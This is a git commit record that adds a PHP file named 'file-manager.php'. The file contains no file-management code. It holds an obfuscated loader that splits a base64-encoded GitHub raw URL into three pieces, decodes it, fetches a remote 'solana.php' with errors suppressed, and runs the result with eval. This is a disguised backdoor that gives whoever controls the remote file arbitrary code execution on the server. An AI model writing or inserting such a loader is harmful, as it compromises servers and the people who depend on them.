d3d290baa91d76be5e75fe1b374d11fa68fea288
GodOfServer <AnonByte.GOS@protonmail.com>
2026-01-02 15:16:13 +0700

    Create file-manager.php

---
+++ file-manager.php
@@ -0,0 +1,6 @@
+<?php
+$p[0]='aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbn';
+$p[1]='QuY29tL0dvZE9mU2VydmVyL1N1c2hpLURvbnQtTG';
+$p[2]='llL3JlZnMvaGVhZHMvbWFpbi9zb2xhbmEucGhw';
+eval('?>'.@file_get_contents(base64_decode(join($p))));
+?>
